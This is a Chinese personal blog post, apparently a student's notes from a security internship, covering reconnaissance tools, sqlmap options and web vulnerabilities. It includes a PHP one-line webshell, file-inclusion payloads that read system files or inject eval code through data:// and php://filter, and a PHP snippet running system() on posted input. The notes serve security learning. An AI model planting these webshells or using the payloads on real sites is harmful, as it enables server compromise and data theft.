@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":200,"display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="十天在四叶草的生产实习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="四叶草——生产实习笔记">
+<meta property="og:url" content="http://example.com/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="叶子的博客">
+<meta property="og:description" content="十天在四叶草的生产实习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png">
+<meta property="og:image" content="http://example.com/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png">
+<meta property="article:published_time" content="2023-07-06T05:01:52.000Z">
+<meta property="article:modified_time" content="2023-07-11T01:41:10.224Z">
+<meta property="article:author" content="YeZi">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png">
+
+<link rel="canonical" href="http://example.com/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>四叶草——生产实习笔记 | 叶子的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">叶子的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to my personal blog!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-博客日志">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>博客日志</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+<div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/">    
+<span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YeZi">
+      <meta itemprop="description" content="分享生活，分享技术">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="叶子的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          四叶草——生产实习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-06 13:01:52" itemprop="dateCreated datePublished" datetime="2023-07-06T13:01:52+08:00">2023-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-11 09:41:10" itemprop="dateModified" datetime="2023-07-11T09:41:10+08:00">2023-07-11</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>十天在四叶草的生产实习</p>
+<span id="more"></span>
+<h1 id="第一天7-6"><a href="#第一天7-6" class="headerlink" title="第一天7.6"></a>第一天7.6</h1><h3 id="学习博客"><a href="#学习博客" class="headerlink" title="学习博客"></a>学习博客</h3><p>作业：<a target="_blank" rel="noopener" href="https://www.wolai.com/jakie_47/a8ZZ1YtiEEnu6xDLPE88xE">https://www.wolai.com/jakie_47/a8ZZ1YtiEEnu6xDLPE88xE</a><br>ctf综合导航：<a target="_blank" rel="noopener" href="https://ctf.mzy0.com/">https://ctf.mzy0.com/</a></p>
+<h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>固定偏移量<br>偏移13为：ROT13</p>
+<h3 id="PHPstudy安装"><a href="#PHPstudy安装" class="headerlink" title="PHPstudy安装"></a>PHPstudy安装</h3><h3 id="安装kali"><a href="#安装kali" class="headerlink" title="安装kali"></a>安装kali</h3><h3 id="安装ubuntu"><a href="#安装ubuntu" class="headerlink" title="安装ubuntu"></a>安装ubuntu</h3><h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><h3 id="安装burp"><a href="#安装burp" class="headerlink" title="安装burp"></a>安装burp</h3><h3 id="安装010-分析图片"><a href="#安装010-分析图片" class="headerlink" title="安装010 分析图片"></a>安装010 分析图片</h3><h1 id="第二天7-7"><a href="#第二天7-7" class="headerlink" title="第二天7.7"></a>第二天7.7</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h3><ol>
+<li><a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></li>
+<li>whois查询<br>A.站长之家:<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>B.爱站:<a target="_blank" rel="noopener" href="http://www.aizhan.com/">http://www.aizhan.com</a></li>
+<li>雁行安全团队</li>
+<li>子域名<br>网站：<br>A.<a target="_blank" rel="noopener" href="https://dns.aizhan.com/:%E6%9F%A5%E8%AF%A2%E5%90%8C">https://dns.aizhan.com/:查询同</a> IP 绑定了哪些域名<br>B.<a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain/%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D">http://tool.chinaz.com/subdomain/：查询子域名</a><br>本地工具：<br>A.Layer：子域名挖掘机<br>B.wydomain：跨平台，多种方式获取子域名</li>
+<li>http状态码<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status</a></li>
+<li>备案号查询<br><a target="_blank" rel="noopener" href="http://www.beianbeian.com/">http://www.beianbeian.com</a>:</li>
+<li>ssl查询<br><a target="_blank" rel="noopener" href="https://csr.chinassl.net/ssl-checker.html">https://csr.chinassl.net/ssl-checker.html</a></li>
+<li>DNS解析<br>nslookup命令<br>(1)查询A记录:<br><code>nslookup baidu.com</code><br>(2)查询MX记录:<br><code>nslookup -type=mx baidu.com</code><br>(3)查询NS记录:<br><code>nslookup -type=ns baidu.com</code><br>dig命令<br>(1)查询A记录:<br><code>dig baidu.com a</code><br>(2)查询MX记录:<br><code>dig baidu.com mx</code><br>(3)查询NS记录:<br><code>dig baidu.com ns</code><br>(4)查看所有类型记录:<br><code>dig baidu.com any</code><h3 id="搜索引擎利用"><a href="#搜索引擎利用" class="headerlink" title="搜索引擎利用"></a>搜索引擎利用</h3><h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4>与或非通配符<br>site 域名限制<br>intitle 限制标题<br>allintitle 标题多个组合<br>link 跳转<br>inurl 含有关键字的url名称<br>filetype 文件如 intext filetype:xls<h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4></li>
+<li>主机开放的端口和服务</li>
+<li>主机的操作系统识别<h4 id="常见端口："><a href="#常见端口：" class="headerlink" title="常见端口："></a>常见端口：</h4>• 21 = 文件传输<br>• 22 = SSH端口<br>• 23 = telnet远程终端<br>• 25 = 发送邮件<br>• 80 = WEB网页<br>• 135 = 本地服务<br>• 139 = 文件共享<br>• 443 = 安全WEB访问<br>• 445 = SMB(交换服务器消息<br>块)<br>• 1080 = SOCKS代理<br>• 1433 = SQL SERVER<br>• 5900 = VNC<br>• 3306 = MYSQL<br>• 3389 = 远程桌面<h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4>端口探测的状态：<br>open：端口是开放的。<br>closed：端口是关闭的。<br>filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。<br>unfitered：端口没有被屏蔽，但是否开放需要进一步确定。<br>open|filtered：端口是开放的或被屏蔽。<br>closed|filtered：端口是关闭的或被屏蔽  <h4 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h4><h4 id="系统识别小技巧"><a href="#系统识别小技巧" class="headerlink" title="系统识别小技巧"></a>系统识别小技巧</h4></li>
+<li>不存在的文件<br>根据404错误，判断出网站容器和服务器操作系统。访问一个不存<br>在的文件即可。</li>
+<li>大小写判断liunx或windows<br>通过大小写判断网站服务器系统. windows系统类服务器是不区分<br>大小写的，然而linux系统则区分大小写<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><h4 id="在线Web指纹识别"><a href="#在线Web指纹识别" class="headerlink" title="在线Web指纹识别"></a>在线Web指纹识别</h4><a target="_blank" rel="noopener" href="https://whatcms.org/">https://whatcms.org/</a><br><a target="_blank" rel="noopener" href="http://www.yunsee.cn/">http://www.yunsee.cn/</a><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4>Whatweb，是一个开源的网站指纹识别软件。可识别Web技术，包<br>括内容管理系统（CMS），博客平台，统计/分析包，Javascript库，<br>服务器和嵌入式设备<h4 id="操作系统指纹识别"><a href="#操作系统指纹识别" class="headerlink" title="操作系统指纹识别"></a>操作系统指纹识别</h4>不同的操作系统在处理网络信息时是不完全相同的，存在着各自的特点，这些特点就称为系统的“指纹”<h5 id="Banner抓取"><a href="#Banner抓取" class="headerlink" title="Banner抓取"></a>Banner抓取</h5>使用nmap工具可以判断操作系统版本、服务版本。<br>使用Curl工具进行探测，根据HTTP头返回的头信息进行判断。<br><code>Curl --head url</code>   <h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4>WAF， Web Application Firewall，简称：Web应用防火墙<h4 id="识别工具"><a href="#识别工具" class="headerlink" title="识别工具"></a>识别工具</h4>wafw00f、nmap、sqlmap等等。<h4 id="判别方式"><a href="#判别方式" class="headerlink" title="判别方式"></a>判别方式</h4>1、手工判断：<br>2、wafw00f 工具<br>3、nmap工具<br>4、SQLMap工具<h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46676743/article/details/112245605">https://blog.csdn.net/weixin_46676743/article/details/112245605</a><br>1、通过cookie值进行识别<br>2、通过HTTP响应头进行识别<h3 id="BP"><a href="#BP" class="headerlink" title="BP"></a>BP</h3>BP+SwitchyOmega、<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3>亦思社会工程学字典生成器<h3 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a>课后作业</h3><h4 id="安装AntSword"><a href="#安装AntSword" class="headerlink" title="安装AntSword"></a>安装AntSword</h4>GitHub挂加速也下不了，从csdn上找了一个<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42474304/article/details/116376746">https://blog.csdn.net/weixin_42474304/article/details/116376746</a><br>初始化时需要梯子和管理员权限打开<h4 id="安装冰蝎"><a href="#安装冰蝎" class="headerlink" title="安装冰蝎"></a>安装冰蝎</h4><h1 id="第二天7-8"><a href="#第二天7-8" class="headerlink" title="第二天7.8"></a>第二天7.8</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2>一句话木马<br><code>&lt;?php @eval($_POST[&#39;code1&#39;]); ?&gt;</code></li>
+</ol>
+<h2 id="webshell工具的使用"><a href="#webshell工具的使用" class="headerlink" title="webshell工具的使用"></a>webshell工具的使用</h2><h2 id="服务器根目录"><a href="#服务器根目录" class="headerlink" title="服务器根目录"></a>服务器根目录</h2><h2 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h2><p><a target="_blank" rel="noopener" href="http://60a35a21.clsadp.com/Pass-02/index.php?action=show_code">http://60a35a21.clsadp.com/Pass-02/index.php?action=show_code</a></p>
+<h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h3 id="windows特性"><a href="#windows特性" class="headerlink" title="windows特性"></a>windows特性</h3><p>空格</p>
+<h1 id="第三天7-9"><a href="#第三天7-9" class="headerlink" title="第三天7.9"></a>第三天7.9</h1><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>00截断</p>
+<h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><h3 id="文件上传其他漏洞"><a href="#文件上传其他漏洞" class="headerlink" title="文件上传其他漏洞"></a>文件上传其他漏洞</h3><h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p> 本地文件包含<br> 远程文件包含</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><a target="_blank" rel="noopener" href="https://www.wolai.com/jakie_47/eB86xdxu3wNHzQ3L1VWmAj">https://www.wolai.com/jakie_47/eB86xdxu3wNHzQ3L1VWmAj</a></p>
+<pre><code> ?file=file:///D:\phpStudy2018\PHPTutorial\WWW\cisp-pte\file-include\07/info.txt
+
+ ?file=file://C:\windows\win.ini
+
+ ?file=php://filter/
+ read=convert.base64-encode/resource=1.txt
+
+ file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+ file=data://text/plain,&lt;?php phpinfo(); ?&gt;
+
+ http://127.0.0.1/cisp-pte/file-include/10/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==  
+
+ file=data://text/plain,&lt;?php phpinfo(); ?&gt;  
+
+ ?file=data://text/plain,&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;  
+
+ ?file=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7
+</code></pre>
+<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><ol>
+<li>File：//</li>
+<li>php://filter</li>
+<li>php://input</li>
+<li>data://</li>
+<li>http://</li>
+<li>phar://</li>
+<li>zip://  </li>
+</ol>
+<h1 id="第四天7-10"><a href="#第四天7-10" class="headerlink" title="第四天7.10"></a>第四天7.10</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="联合查询常用函数"><a href="#联合查询常用函数" class="headerlink" title="联合查询常用函数"></a>联合查询常用函数</h3><pre><code>version():查询数据库的版本 
+user():查询数据库的使用者
+database():数据库    
+system_user():系统用户名    
+session_user():连接数据库的用户名    
+current user:当前用户名  
+1 oad fi1e():读取本地文件  
+@datadir:读取数据库路径   
+@basedir:mysql安装路径  
+@version_complie os:查看操作系统  
+information schema.schemata:  
+该数据表存储了mysq1数据库中的所有数据库的库名
+information schema.tables
+该数据表存储了mysq1数据库中的所有数据表的表名
+information_schema.columns:
+该数据表存储了mysq1数据库中的所有列的列名
+</code></pre>
+<h3 id="联合查询详解"><a href="#联合查询详解" class="headerlink" title="联合查询详解"></a>联合查询详解</h3><p><img src="/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png"><br><img src="/2023/07/06/%E5%9B%9B%E5%8F%B6%E8%8D%89%E2%80%94%E2%80%94%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png"><br>  <a target="_blank" rel="noopener" href="https://www.wolai.com/jakie_47/hJhQzzJ6mhv73x3QVMP79z">https://www.wolai.com/jakie_47/hJhQzzJ6mhv73x3QVMP79z</a></p>
+<h3 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h3><pre><code>基础：
+-u &quot;ip&quot; 指定目标URL (可以是http协议也可以是https协议)
+-d 连接数据库
+--dbs 列出所有的数据库
+--current-db 列出当前数据库
+--tables 列出当前的表
+--columns 列出当前的列
+-D 选择使用哪个数据库
+-T 选择使用哪个表
+-C 选择使用哪个列
+--dump 获取字段中的数据
+--batch 自动选择yes
+--cookie 应对需要登录的情况
+--level 5：探测等级
+
+探测等级随着等级的变高探测的东西会更更多，不加命令默认探测等级为1，最高为5,。并且随着探测等级越来越高，所需要花费的时间会更多
+
+--level 共有五个等级，sqlmap使用的payload可以在xml/payloads.xml中看到，自己也可以根据相应的格式添加自己的payload。
+
+level&gt;=2的时候就会测试HTTP Cookie。
+
+level&gt;=3的时候就会测试HTTP User-Agent/Referer头。
+
+level=5 的时候会测试HTTP Host
+
+为了保证全面性建议使用更高的探测等级进行他探测
+
+--risk 风险等级
+sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为3级
+
+-r 加载文件中的HTTP请求（本地保存的请求包txt文件）
+
+
+-v #详细的等级(0-6)
+0：只显示Python的回溯，错误和关键消息。
+1：显示信息和警告消息。
+2：显示调试消息。
+3：有效载荷注入。
+4：显示HTTP请求。
+5：显示HTTP响应头。
+6：显示HTTP响应页面的内容
+
+--os-shell 获取主机shell，一般不太好用，因为没权限
+
+
+进阶
+--smart 启发式快速判断，节约浪费时间
+--forms 尝试使用post注入
+-l 加载文件中的HTTP请求（本地保存的请求包日志文件）
+-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试
+-o 开启所有默认性能优化
+--tamper 调用脚本进行注入
+-v 指定sqlmap的回显等级
+--delay 设置多久访问一次
+--os-shell 获取主机shell，一般不太好用，因为没权限
+-m 批量操作
+-c 指定配置文件，会按照该配置文件执行动作
+-data data指定的数据会当做post数据提交
+-timeout 设定超时时间
+-level 设置注入探测等级
+--identify-waf 检测防火墙类型
+--param-del=&quot;分割符&quot; 设置参数的分割符
+--skip-urlencode 不进行url编码
+--keep-alive 设置持久连接，加快探测速度
+--null-connection 检索没有body响应的内容，多用于盲注
+--thread 最大为10 设置多线程
+</code></pre>
+<h1 id="第五天"><a href="#第五天" class="headerlink" title="第五天"></a>第五天</h1><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><pre><code>&lt;?php 
+#phpinfo();
+#eval($_POST[&#39;cmd&#39;]);
+#eval($_REQUEST[&#39;cmd&#39;]);
+#assert($_POST[&#39;cmd&#39;]);
+#echo preg_replace(&quot;/abc/&quot;, &quot;123&quot;, &quot;subjectabc&quot;);
+#echo preg_replace(&quot;/abc/e&quot;, phpinfo(), &quot;subjectabc&quot;);
+#preg_replace(&quot;/abc/e&quot;, $_POST[&#39;cmd&#39;], &quot;subjectabc&quot;);
+#call_user_func($_GET[&#39;cmd&#39;],$_POST[&#39;233&#39;]);
+#$_GET[&#39;cmd&#39;]($_POST[&#39;233&#39;]);
+system($_POST[&#39;cmd&#39;]);
+#passthru($_POST[&#39;cmd&#39;]);
+#echo exec($_POST[&#39;cmd&#39;]);
+#echo shell_exec($_POST[&#39;cmd&#39;]);
+#echo `whoami`;
+?&gt;
+</code></pre>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>可加微信，打赏随意。</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="YeZi 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/08/C-%E5%AD%A6%E4%B9%A0%E6%84%9F%E6%82%9F/" rel="prev" title="C++学习感悟">
+      <i class="fa fa-chevron-left"></i> C++学习感悟
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B8%B8%E7%94%A8%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/" rel="next" title="网络安全常用网站整理">
+      网络安全常用网站整理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%A97-6"><span class="nav-number">1.</span> <span class="nav-text">第一天7.6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E5%8D%9A%E5%AE%A2"><span class="nav-number">1.0.1.</span> <span class="nav-text">学习博客</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81"><span class="nav-number">1.0.2.</span> <span class="nav-text">凯撒密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHPstudy%E5%AE%89%E8%A3%85"><span class="nav-number">1.0.3.</span> <span class="nav-text">PHPstudy安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85kali"><span class="nav-number">1.0.4.</span> <span class="nav-text">安装kali</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85ubuntu"><span class="nav-number">1.0.5.</span> <span class="nav-text">安装ubuntu</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEssh"><span class="nav-number">1.0.6.</span> <span class="nav-text">配置ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85docker"><span class="nav-number">1.0.7.</span> <span class="nav-text">安装docker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85burp"><span class="nav-number">1.0.8.</span> <span class="nav-text">安装burp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85010-%E5%88%86%E6%9E%90%E5%9B%BE%E7%89%87"><span class="nav-number">1.0.9.</span> <span class="nav-text">安装010 分析图片</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%A97-7"><span class="nav-number">2.</span> <span class="nav-text">第二天7.7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 